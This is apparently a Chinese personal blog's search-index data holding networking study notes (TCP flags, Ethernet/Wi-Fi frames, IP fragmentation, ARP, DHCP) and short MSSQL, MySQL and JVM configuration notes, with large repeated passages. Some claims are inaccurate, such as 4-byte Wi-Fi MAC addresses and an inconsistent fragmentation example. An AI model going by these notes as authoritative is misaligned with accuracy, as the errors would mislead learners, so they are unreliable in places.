时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#tcp-options-相关参数"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#tcp-建立连接"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#tcp-连接释放"},{"categories":["blog"],"content":" FAQ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:3:0","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#faq"},{"categories":["blog"],"content":" TCP segment 段和 package 包在 TCP（传输控制协议）中，“Segment size”（段大小）和 “Packet”（包）是两个不同但相关的概念。 “Segment size” 指的是 TCP 协议中数据传输时每个 TCP 段（segment）的最大大小。TCP 使用分段（segmentation）将应用程序发送的数据划分为较小的片段进行传输。这些片段被称为 TCP 段，每个段都包含一个 TCP 头部和有效载荷（数据）。段的大小由操作系统或网络堆栈的配置参数确定，并且可以根据网络条件进行调整。通常情况下，段的大小在几百字节到几千字节之间。 而 “Packet”（包）是在网络层（如互联网协议 IP）上进行数据传输时使用的单位。包是由网络层负责封装和传递的，其中包括源地址、目标地址和有效载荷（即从传输层接收到的 TCP 段）。包的大小由网络层协议定义，例如在 IPv4 中，包的最大大小为 64KB。 区别： 概念层次不同：TCP 段是在传输层协议 TCP 中定义的，而包是在网络层协议（如 IP）中定义的。 功能不同：TCP 段负责将数据从应用程序发送到接收方的 TCP 协议栈，而包在网络中进行路由和传递，确保数据的正确交付。 大小限制不同：TCP 段的大小受到 TCP 协议栈的配置参数限制，而包的大小由网络层协议定义。 联系： 在传输过程中，应用程序发送的数据会被 TCP 协议分割成多个段（segment），每个段都会被封装为一个网络层的包（packet）进行传输。这两个概念都是为了实现可靠的数据传输和网络通信而存在的。 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:3:1","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#tcp-segment-段和-package-包"},{"categories":["blog"],"content":" TCP_CORK 和 TCP_NODELAYNagle 算法规定包满足 MSS 立即发送, 否则需要发送 ACK 确认包. 而每个包都发送 ACK, 会降低性能. DelayedAcknowledgment 不再针对单个包发送 ACK，而是一次确认两个包，或者在发送响应数据的同时捎带着发送 ACK，又或者触发超时时间后再发送 ACK. 而一旦这两点同时工作, 在发送小包的时候, 就需要等待 ack 回传, 才能发送. 为什么一般延迟是 40 ms 呢? redhat文档说默认是这个值, RFC 9293 说必须少于 0.5 seconds, 所以设置的 40 ms 吧. 如何解决呢? 启用 TCP_NODELAY , 禁用 Nagle 算法. nginx配置 就用了这个配置. 其中 TCP_NOPUSH 就是 TCP_CORK 参数, 可以和 TCP_DELAY 配置使用, 让 nginx 在发送文件的时候每个包尽量多的存放数据. TCP_NODELAY 就是在其他情况下, 减少延迟用的. 参考资料 TCP_NODELAY 和 TCP_NOPUSH的解释 - wajika - 博客园 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:3:2","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#tcp_cork-和-tcp_nodelay"},{"categories":["blog"],"content":"这里记录一些文档的格式, 有时候写文档不知道还要写一些什么方面, 维度信息. 可以做一个参考.","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%96%87%E6%A1%A3%E5%8A%A9%E6%89%8B/","series":null,"tags":["blog","文档助手"],"title":"文档助手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%96%87%E6%A1%A3%E5%8A%A9%E6%89%8B/"},{"categories":["blog"],"content":" 简介这里记录一些文档的格式, 有时候写文档不知道还要写一些什么方面, 维度信息. 可以做一个参考. ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%96%87%E6%A1%A3%E5%8A%A9%E6%89%8B/:1:0","series":null,"tags":["blog","文档助手"],"title":"文档助手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%96%87%E6%A1%A3%E5%8A%A9%E6%89%8B/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%96%87%E6%A1%A3%E5%8A%A9%E6%89%8B/:2:0","series":null,"tags":["blog","文档助手"],"title":"文档助手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%96%87%E6%A1%A3%E5%8A%A9%E6%89%8B/#内容"},{"categories":["blog"],"content":" 调研 - 主干 背景、问题 整理分析、目的 介绍、概览（图标）、对比（表格） 细节 概念统一、规范 示例（代码） 参考信息（链接） ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%96%87%E6%A1%A3%E5%8A%A9%E6%89%8B/:2:1","series":null,"tags":["blog","文档助手"],"title":"文档助手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%96%87%E6%A1%A3%E5%8A%A9%E6%89%8B/#调研---主干"},{"categories":["blog"],"content":" 计划任务 - 5w2h why- 为什么做 what- 做什么 when- 何时 where- 何地 who- 谁来做 how to- 如何做 how much- 做到什么程度 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%96%87%E6%A1%A3%E5%8A%A9%E6%89%8B/:2:2","series":null,"tags":["blog","文档助手"],"title":"文档助手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%96%87%E6%A1%A3%E5%8A%A9%E6%89%8B/#计划任务---5w2h"},{"categories":["point"],"content":"mssql 是一个关系型数据库, 类似与 mysql, oracle. 要点: 收费 微软家的, 大厂支持 性能强 ","date":"2023-07-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/mssql/:0:0","series":null,"tags":["point","mssql"],"title":"mssql","uri":"/posts/%E7%AC%94%E8%AE%B0/point/mssql/#"},{"categories":["blog"],"content":"这里记录 [[笔记/point/mssql|mssql]] 的常用命令和配置.","date":"2023-07-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/mssql%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/","series":null,"tags":["blog","mssql","docker"],"title":"mssql的配置和使用","uri":"/posts/%E7%AC%94%E8%AE%B0/mssql%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["blog"],"content":" 简介这里记录 mssql 的常用命令和配置. ","date":"2023-07-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/mssql%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/:1:0","series":null,"tags":["blog","mssql","docker"],"title":"mssql的配置和使用","uri":"/posts/%E7%AC%94%E8%AE%B0/mssql%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/#简介"},{"categories":["blog"],"content":" 操作手册","date":"2023-07-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/mssql%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/:2:0","series":null,"tags":["blog","mssql","docker"],"title":"mssql的配置和使用","uri":"/posts/%E7%AC%94%E8%AE%B0/mssql%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/#操作手册"},{"categories":["blog"],"content":" docker 启动 # ACCEPT_EULA=Y 接收用户协议 # SA_PASSWORD 密码 # MSSQL_PID 指定版本,默认 -e 'MSSQL_PID=Developer' # 版本参考 https://learn.microsoft.com/zh-cn/sql/sql-server/editions-and-components-of-sql-server-2019?view=sql-server-ver16 docker run -e 'ACCEPT_EULA=Y' -e 'MSSQL_SA_PASSWORD=123456' -p 1433:1433 -v /data/msdata:/var/opt/mssql/data -v /data/mslog:/var/opt/mssql/log -v /data/secrets:/var/opt/mssql/secrets -d --name mssql mcr.microsoft.com/mssql/server:latest ","date":"2023-07-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/mssql%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/:2:1","series":null,"tags":["blog","mssql","docker"],"title":"mssql的配置和使用","uri":"/posts/%E7%AC%94%E8%AE%B0/mssql%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/#docker-启动"},{"categories":["blog"],"content":" sql 语法 # 日期转字符串 CONVERT(CHAR(8), CURRENT_TIMESTAMP, 112) ---20060222 CONVERT(CHAR(19), CURRENT_TIMESTAMP, 120) ---2006-02-22 16:26:08 CONVERT(CHAR(10), CURRENT_TIMESTAMP, 23) ---2006-02-22 # 字符串转日期 cast('2013-03-01' as datetime) cast('20130301' as datetime) ","date":"2023-07-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/mssql%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/:2:2","series":null,"tags":["blog","mssql","docker"],"title":"mssql的配置和使用","uri":"/posts/%E7%AC%94%E8%AE%B0/mssql%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/#sql-语法"},{"categories":["point"],"content":"mysql 是一个关系型数据库, 类似与 mssql, oracle. 要点: 免费使用 用户量非常多 ","date":"2023-07-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/mysql/:0:0","series":null,"tags":["point","mysql"],"title":"mysql","uri":"/posts/%E7%AC%94%E8%AE%B0/point/mysql/#"},{"categories":["point"],"content":"java 是一种非常流行的编程语言, 基于 JVM 虚拟机. 要点: 开源, 社区庞大 性能不错 吃资源 ","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/java/:0:0","series":null,"tags":["point","java"],"title":"java","uri":"/posts/%E7%AC%94%E8%AE%B0/point/java/#"},{"categories":["blog"],"content":"我不怎么写 [[笔记/point/java|java]] 代码, 但是国内一般都是 java 后台, 所以记录一些配置和操作, 方便复用.","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/"},{"categories":["blog"],"content":" 简介我不怎么写 java 代码, 但是国内一般都是 java 后台, 所以记录一些配置和操作, 方便复用. ","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/:1:0","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/#简介"},{"categories":["blog"],"content":" 安装 下载对应版本的 jdk OpenJDK JDK 21.0.2 GA Release, 地址路径可以修改, 对应 jdk 的大版本 配置环境变量 JAVA_HOME: /path/21-jdk CLASSPATH: /path/21-jdk/lib/tools.jar PATH 新增路径 /path/21-jdk/bin ","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/:2:0","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/#安装"},{"categories":["blog"],"content":" JVM 启动参数","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/:3:0","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/#jvm-启动参数"},{"categories":["blog"],"content":" JVM 内存配置可以理解成 java运行内存 = 堆内存 + 元空间 + 非堆内存. 堆内存：通过参数设置 元空间：通过参数设置 非堆内存：线程数 *1m + non-heap 线程数：pstree pid 常用内存参数 -Xms2048m 初始堆大小 -Xmx2048m 最大堆大小 (建议一致，避免伸缩带来的性能影响) -Xmn500m 新生代，可以不设置 -Xss1024k 线程的栈大小，默认 1m。线程数 * 这个值是内存一部分 -XX:MaxMetaspaceSize=256m 最大元数据空间大小 -XX:+UseContainerSupport 使用容器内存,JDK 8u191+、JDK 10 及以上版本 -XX:InitialRAMPercentage=70.0 初始内存百分比 -XX:MaxRAMPercentage=70.0 最大内存百分比 